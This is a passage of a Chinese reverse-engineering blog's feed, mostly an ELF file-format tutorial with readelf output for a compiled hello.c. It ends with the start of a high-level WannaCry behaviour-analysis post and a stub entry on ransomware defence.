class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>STT_NOTYPE(0)</td><td>符号的类型未指定</td></tr><tr><td>STT_OBJECT(1)</td><td>符号与数据对象相关联，例如变量、数组等</td></tr><tr><td>STT_FUNC(2)</td><td>符号与函数或其他可执行代码相关联</td></tr><tr><td>STT_SECTION(3)</td><td>该符号与一个节相关联。 这种类型的符号表条目主要用于重定位，通常具有<code>STB_LOCALBIND</code>属性</td></tr><tr><td>STT_FILE(4)</td><td>一个有<code>STB_LOCAL</code>的<code>BIND</code>属性的文件符号的节索引为<code>SHN_ABS</code>。并且如果存在其他<code>STB_LOCAL</code>属性的符号，则当前符号应该在其之前</td></tr><tr><td>[STT_LOPROC(13), STT_HIPROC(15)]</td><td>预留位，用于特殊处理器的特定含义</td></tr></tbody></table></div><ul><li>INFO：</li></ul><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>SHN_ABS</td><td>符号有一个绝对值，不会因为重定位而改变</td></tr><tr><td>SHN_COMMON</td><td>该符号标记尚未分配的公共块。 符号的值给出了对齐约束，类似于节的<code>sh_addralign</code>成员。 也就是说，链接编辑器将为符号分配存储空间，该地址是 <code>st_value</code>的倍数。 符号的大小表明需要多少字节</td></tr><tr><td>SHN_UNDEF</td><td>此节表索引表示该符号未定义。 当链接编辑器将此对象文件与另一个定义指定符号的文件组合时，此文件对符号的引用将链接到实际定义</td></tr></tbody></table></div><h1 id="4-ELF文件示例"><a href="#4-ELF文件示例" class="headerlink" title="4. ELF文件示例"></a>4. ELF文件示例</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hello.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello world!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将上面的<code>hello.c</code>分别编译为三种不同文件：</p><ul><li><code>gcc -g -c hello.c</code>：生成可重定位文件<code>hello.o</code>。</li><li><code>gcc -g -o hello hello.c</code>：生成可执行文件。</li><li><code>gcc -g -fPIC -o libhello.so -shared hello.c</code>：生成共享目标文件。</li></ul><img src="/posts/187bfa35/4.1.1.png" class="" title="编译ELF文件"><h2 id="4-1-共享目标文件"><a href="#4-1-共享目标文件" class="headerlink" title="4.1 共享目标文件"></a>4.1 共享目标文件</h2><h3 id="4-1-1-ELF文件头"><a href="#4-1-1-ELF文件头" class="headerlink" title="4.1.1 ELF文件头"></a>4.1.1 ELF文件头</h3><p>解析ELF文件头：<code>readelf -h [文件名]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ readelf -h libhello.so </span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              DYN (Shared object file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x0</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          14296 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         9</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         34</span><br><span class="line">  Section header string table index: 33                                  </span><br></pre></td></tr></table></figure><p>从上面的ELF文件头信息中能够看出：当前文件类型为64bit的共享库，小端存储，版本为1，机器架构为x86-64，程序头表项有9项，节头表项有34项。</p><h3 id="4-1-2-程序头表"><a href="#4-1-2-程序头表" class="headerlink" title="4.1.2 程序头表"></a>4.1.2 程序头表</h3><p>解析ELF程序头表：<code>readelf -l [文件名]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ readelf -l libhello.so</span><br><span class="line"></span><br><span class="line">Elf file type is DYN (Shared object file)</span><br><span class="line">Entry point 0x0</span><br><span class="line">There are 9 program headers, starting at offset 64</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">                 0x0000000000000498 0x0000000000000498  R      0x1000</span><br><span class="line">  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000</span><br><span class="line">                 0x0000000000000139 0x0000000000000139  R E    0x1000</span><br><span class="line">  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000</span><br><span class="line">                 0x00000000000000b4 0x00000000000000b4  R      0x1000</span><br><span class="line">  LOAD           0x0000000000002e10 0x0000000000003e10 0x0000000000003e10</span><br><span class="line">                 0x0000000000000218 0x0000000000000220  RW     0x1000</span><br><span class="line">  DYNAMIC        0x0000000000002e20 0x0000000000003e20 0x0000000000003e20</span><br><span class="line">                 0x00000000000001c0 0x00000000000001c0  RW     0x8</span><br><span class="line">  NOTE           0x0000000000000238 0x0000000000000238 0x0000000000000238</span><br><span class="line">                 0x0000000000000024 0x0000000000000024  R      0x4</span><br><span class="line">  GNU_EH_FRAME   0x0000000000002010 0x0000000000002010 0x0000000000002010</span><br><span class="line">                 0x0000000000000024 0x0000000000000024  R      0x4</span><br><span class="line">  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">                 0x0000000000000000 0x0000000000000000  RW     0x10</span><br><span class="line">  GNU_RELRO      0x0000000000002e10 0x0000000000003e10 0x0000000000003e10</span><br><span class="line">                 0x00000000000001f0 0x00000000000001f0  R      0x1</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00     .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt </span><br><span class="line">   01     .init .plt .plt.got .text .fini </span><br><span class="line">   02     .rodata .eh_frame_hdr .eh_frame </span><br><span class="line">   03     .init_array .fini_array .dynamic .got .got.plt .data .bss </span><br><span class="line">   04     .dynamic </span><br><span class="line">   05     .note.gnu.build-id </span><br><span class="line">   06     .eh_frame_hdr </span><br><span class="line">   07     </span><br><span class="line">   08     .init_array .fini_array .dynamic .got </span><br></pre></td></tr></table></figure><p>从展示的程序头表可以看出上半部分的内容基本和程序头表项的每个字段基本对应。从下面的Segment Sections可以看出一个Segment是多个Section的集合。</p><h3 id="4-1-3-节头表"><a href="#4-1-3-节头表" class="headerlink" title="4.1.3 节头表"></a>4.1.3 节头表</h3><p>解析节头表：<code>readelf -S [文件名]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ readelf -S libhello.so</span><br><span class="line">There are 34 section headers, starting at offset 0x37d8:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .note.gnu.bu[...] NOTE             0000000000000238  00000238</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 2] .gnu.hash         GNU_HASH         0000000000000260  00000260</span><br><span class="line">       0000000000000024  0000000000000000   A       3     0     8</span><br><span class="line">  [ 3] .dynsym           DYNSYM           0000000000000288  00000288</span><br><span class="line">       00000000000000a8  0000000000000018   A       4     1     8</span><br><span class="line">  [ 4] .dynstr           STRTAB           0000000000000330  00000330</span><br><span class="line">       0000000000000075  0000000000000000   A       0     0     1</span><br><span class="line">  [ 5] .gnu.version      VERSYM           00000000000003a6  000003a6</span><br><span class="line">       000000000000000e  0000000000000002   A       3     0     2</span><br><span class="line">  [ 6] .gnu.version_r    VERNEED          00000000000003b8  000003b8</span><br><span class="line">       0000000000000020  0000000000000000   A       4     1     8</span><br><span class="line">  [ 7] .rela.dyn         RELA             00000000000003d8  000003d8</span><br><span class="line">       00000000000000a8  0000000000000018   A       3     0     8</span><br><span class="line">  [ 8] .rela.plt         RELA             0000000000000480  00000480</span><br><span class="line">       0000000000000018  0000000000000018  AI       3    21     8</span><br><span class="line">  [ 9] .init             PROGBITS         0000000000001000  00001000</span><br><span class="line">       0000000000000017  0000000000000000  AX       0     0     4</span><br><span class="line">  [10] .plt              PROGBITS         0000000000001020  00001020</span><br><span class="line">       0000000000000020  0000000000000010  AX       0     0     16</span><br><span class="line">  [11] .plt.got          PROGBITS         0000000000001040  00001040</span><br><span class="line">       0000000000000008  0000000000000008  AX       0     0     8</span><br><span class="line">  [12] .text             PROGBITS         0000000000001050  00001050</span><br><span class="line">       00000000000000de  0000000000000000  AX       0     0     16</span><br><span class="line">  [13] .fini             PROGBITS         0000000000001130  00001130</span><br><span class="line">       0000000000000009  0000000000000000  AX       0     0     4</span><br><span class="line">  [14] .rodata           PROGBITS         0000000000002000  00002000</span><br><span class="line">       000000000000000d  0000000000000000   A       0     0     1</span><br><span class="line">  [15] .eh_frame_hdr     PROGBITS         0000000000002010  00002010</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [16] .eh_frame         PROGBITS         0000000000002038  00002038</span><br><span class="line">       000000000000007c  0000000000000000   A       0     0     8</span><br><span class="line">  [17] .init_array       INIT_ARRAY       0000000000003e10  00002e10</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [18] .fini_array       FINI_ARRAY       0000000000003e18  00002e18</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [19] .dynamic          DYNAMIC          0000000000003e20  00002e20</span><br><span class="line">       00000000000001c0  0000000000000010  WA       4     0     8</span><br><span class="line">  [20] .got              PROGBITS         0000000000003fe0  00002fe0</span><br><span class="line">       0000000000000020  0000000000000008  WA       0     0     8</span><br><span class="line">  [21] .got.plt          PROGBITS         0000000000004000  00003000</span><br><span class="line">       0000000000000020  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .data             PROGBITS         0000000000004020  00003020</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     8</span><br><span class="line">  [23] .bss              NOBITS           0000000000004028  00003028</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     1</span><br><span class="line">  [24] .comment          PROGBITS         0000000000000000  00003028</span><br><span class="line">       000000000000001e  0000000000000001  MS       0     0     1</span><br><span class="line">  [25] .debug_aranges    PROGBITS         0000000000000000  00003046</span><br><span class="line">       0000000000000030  0000000000000000           0     0     1</span><br><span class="line">  [26] .debug_info       PROGBITS         0000000000000000  00003076</span><br><span class="line">       00000000000000b5  0000000000000000           0     0     1</span><br><span class="line">  [27] .debug_abbrev     PROGBITS         0000000000000000  0000312b</span><br><span class="line">       0000000000000064  0000000000000000           0     0     1</span><br><span class="line">  [28] .debug_line       PROGBITS         0000000000000000  0000318f</span><br><span class="line">       0000000000000052  0000000000000000           0     0     1</span><br><span class="line">  [29] .debug_str        PROGBITS         0000000000000000  000031e1</span><br><span class="line">       00000000000000a7  0000000000000001  MS       0     0     1</span><br><span class="line">  [30] .debug_line_str   PROGBITS         0000000000000000  00003288</span><br><span class="line">       000000000000001b  0000000000000001  MS       0     0     1</span><br><span class="line">  [31] .symtab           SYMTAB           0000000000000000  000032a8</span><br><span class="line">       0000000000000270  0000000000000018          32    20     8</span><br><span class="line">  [32] .strtab           STRTAB           0000000000000000  00003518</span><br><span class="line">       0000000000000178  0000000000000000           0     0     1</span><br><span class="line">  [33] .shstrtab         STRTAB           0000000000000000  00003690</span><br><span class="line">       0000000000000141  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure><p>从上面看出内容基本和程序头表项的每个字段基本对应。除了上面提到的特殊的节也有一些额外的节，比如<code>.got.plt</code>。</p><h3 id="4-1-4-符号表"><a href="#4-1-4-符号表" class="headerlink" title="4.1.4 符号表"></a>4.1.4 符号表</h3><p>解析符号表：<code>readelf -s [文件名]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ readelf -s libhello.so</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.dynsym&#x27; contains 7 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)</span><br><span class="line">     3: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     4: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">     5: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2.2.5 (2)</span><br><span class="line">     6: 0000000000001109    37 FUNC    GLOBAL DEFAULT   12 main</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 26 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">     2: 0000000000001050     0 FUNC    LOCAL  DEFAULT   12 deregister_tm_clones</span><br><span class="line">     3: 0000000000001080     0 FUNC    LOCAL  DEFAULT   12 register_tm_clones</span><br><span class="line">     4: 00000000000010c0     0 FUNC    LOCAL  DEFAULT   12 __do_global_dtors_aux</span><br><span class="line">     5: 0000000000004028     1 OBJECT  LOCAL  DEFAULT   23 completed.0</span><br><span class="line">     6: 0000000000003e18     0 OBJECT  LOCAL  DEFAULT   18 __do_global_dtor[...]</span><br><span class="line">     7: 0000000000001100     0 FUNC    LOCAL  DEFAULT   12 frame_dummy</span><br><span class="line">     8: 0000000000003e10     0 OBJECT  LOCAL  DEFAULT   17 __frame_dummy_in[...]</span><br><span class="line">     9: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS hello.c</span><br><span class="line">    10: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    11: 00000000000020b0     0 OBJECT  LOCAL  DEFAULT   16 __FRAME_END__</span><br><span class="line">    12: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS </span><br><span class="line">    13: 0000000000001130     0 FUNC    LOCAL  DEFAULT   13 _fini</span><br><span class="line">    14: 0000000000004020     0 OBJECT  LOCAL  DEFAULT   22 __dso_handle</span><br><span class="line">    15: 0000000000003e20     0 OBJECT  LOCAL  DEFAULT   19 _DYNAMIC</span><br><span class="line">    16: 0000000000002010     0 NOTYPE  LOCAL  DEFAULT   15 __GNU_EH_FRAME_HDR</span><br><span class="line">    17: 0000000000004028     0 OBJECT  LOCAL  DEFAULT   22 __TMC_END__</span><br><span class="line">    18: 0000000000004000     0 OBJECT  LOCAL  DEFAULT   21 _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    19: 0000000000001000     0 FUNC    LOCAL  DEFAULT    9 _init</span><br><span class="line">    20: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">    21: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5</span><br><span class="line">    22: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">    23: 0000000000001109    37 FUNC    GLOBAL DEFAULT   12 main</span><br><span class="line">    24: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">    25: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@G[...]</span><br></pre></td></tr></table></figure><p>可以看出符号表有两个，分别为<code>dynsym</code>和<code>symtab</code>，<code>symtab</code>中包含所有在程序中出现的符号以及一些库函数的符号，而<code>dynsym</code>中的符号是<code>symtab</code>中符号的子集，仅仅出现了外部可以看到的符号（比如静态函数<code>mult</code>的符号在<code>dynsym</code>就看不到）。这是因为<code>dynsym</code>中的符号只有在动态链接时也就是运行时才能被解析。</p><h1 id="5-解析ELF文件相关工具"><a href="#5-解析ELF文件相关工具" class="headerlink" title="5. 解析ELF文件相关工具"></a>5. 解析ELF文件相关工具</h1><h2 id="5-1-objdump"><a href="#5-1-objdump" class="headerlink" title="5.1 objdump"></a>5.1 objdump</h2><p>objdump 有点像快速查看之类的工具，就是以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息。对于想进一步了解系统的程序员，应该掌握这种工具，至少你可以自己写写shellcode了，或者看看人家给的 exploit 中的 shellcode 是什么东西。</p><p>Windows下使用objdump需要下载<a href="https://developer.android.google.cn/ndk/downloads/index.html">Android NDK</a>，将objdump所在路径添加到环境变量，就可以使用objdump了。Windows下的objdump工具名为llvm-objdump。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">llvm-objdump -S pwn1 &gt; Disassembly.txt//-S 尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数</span><br><span class="line">llvm-objdump -s pwn1 &gt; Section.txt//-s 显示指定section的完整内容</span><br></pre></td></tr></table></figure><h2 id="5-2-readelf"><a href="#5-2-readelf" class="headerlink" title="5.2 readelf"></a>5.2 readelf</h2><p>用法同4.1</p><p>Windows下的readelf也在Android NDK中，与objdump同一个目录。Windows下的objdump工具名为llvm-readelf。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Desktop&gt;llvm-readelf -h pwn1</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              EXEC (Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x401060</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          14680 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         11</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         29</span><br><span class="line">  Section header string table index: 28</span><br></pre></td></tr></table></figure><h2 id="5-3-010-Editor"><a href="#5-3-010-Editor" class="headerlink" title="5.3 010 Editor"></a>5.3 010 Editor</h2><p>在分析ELF文件格式时就用到了010 Editor，载入ELF模板分析ELF文件事半功倍。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Android是基于Linux开发的，所以了解ELF格式对学习Android逆向和Linux逆向是必不可少的。&lt;/p&gt;
&lt;p&gt;可执行与可链接格式 （Executable and Linkable Format，ELF），常被称为 ELF格式，是一种用于可执行文件、目标代码、共享库和核心转储（core dump）的标准文件格式，一般用于类Unix系统，比如Linux，Macox等。ELF 格式灵活性高、可扩展，并且跨平台。比如它支持不同的字节序和地址范围，所以它不会不兼容某一特别的 CPU 或指令架构。这也使得 ELF 格式能够被运行于众多不同平台的各种操作系统广泛采纳。&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>WannaCry病毒的行为机理分析</title>
    <link href="http://example.com/posts/d0c575b3.html"/>
    <id>http://example.com/posts/d0c575b3.html</id>
    <published>2022-07-14T11:34:12.668Z</published>
    <updated>2022-07-17T02:43:14.063Z</updated>
    
    <content type="html"><![CDATA[<p>上一篇文章是利用永恒之蓝漏洞上传WannaCry勒索病毒，所以这篇文章将详细讲解WannaCry勒索病毒的原理。</p><span id="more"></span><h1 id="1-WannaCry病毒分析"><a href="#1-WannaCry病毒分析" class="headerlink" title="1. WannaCry病毒分析"></a>1. WannaCry病毒分析</h1><p>分析方法主要有两种：静态分析和动态分析。</p><ul><li><p>静态分析以反汇编为主，通过分析勒索软件的代码了解其行为和各功能实现细节</p></li><li><p>动态分析主要有动态调试、行为分析、沙盒分析</p><p>动态调试主要配合静态分析进行，对静态分析进行辅助。</p><p>行为分析主要通过系统日志来观察勒索软件的行为，从而了解勒索软件行为。</p><p>沙盒分析作为目前自动化分析的主要手段，主要用来辅助手动分析，通过在沙盒中运行勒索软件，能够得到勒索软件的API调用、文件行为、网络行为等行为。</p></li></ul><p>首先来看安天分享的WannaCry流程图，其运行流程包括：</p><ul><li>主程序文件利用漏洞传播自身，运行WannaCry勒索程序</li><li>WannaCry勒索程序释放<code>tasksche.exe</code>，对磁盘文件进行加密勒索</li><li><code>@WanaDecryptor@.exe</code>显示勒索信息，解密示例文件</li></ul><img src="/posts/d0c575b3/1.1.1.png" class="" title="WannaCry病毒的行为分析">]]></content>
    
    
    <summary type="html">&lt;p&gt;上一篇文章是利用永恒之蓝漏洞上传WannaCry勒索病毒，所以这篇文章将详细讲解WannaCry勒索病毒的原理。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="样本分析" scheme="http://example.com/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>外部威胁防护和勒索病毒对抗</title>
    <link href="http://example.com/posts/11f48b75.html"/>
    <id>http://example.com/posts/11f48b75.html</id>
    <published>2022-07-13T05:46:20.002Z</published>
    <updated>2022-07-17T02:35:59.245Z</updated>
    
